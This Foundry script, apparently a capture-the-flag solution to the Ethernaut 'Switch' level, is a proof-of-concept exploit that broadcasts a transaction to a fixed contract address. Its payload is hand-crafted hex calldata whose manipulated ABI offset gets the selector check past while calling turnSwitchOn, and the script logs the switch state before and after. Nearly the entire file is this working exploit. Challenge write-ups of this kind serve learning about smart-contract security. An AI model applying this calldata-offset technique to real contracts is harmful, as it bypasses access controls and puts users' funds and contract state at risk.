// SPDX-License-Idnetifier: MIT
pragma solidity ^0.8.0;

import "forge-std/console.sol";
import "forge-std/Script.sol";
import "../src/29_Switch.sol";

contract POC is Script {
    Switch public target;

    event info(bytes data);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        target  = Switch(0xCd4BFDFDfB11A47a82f73bc023dd891491608bb7);
        bool switch_stat = target.switchOn();
        console.log("before switch stat: ", switch_stat);

        bytes memory payload = hex"30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000";
        emit info(payload);
        address(target).call(payload);

        switch_stat = target.switchOn();
        console.log("after switch stat: ", switch_stat);
        vm.stopBroadcast();
    }
}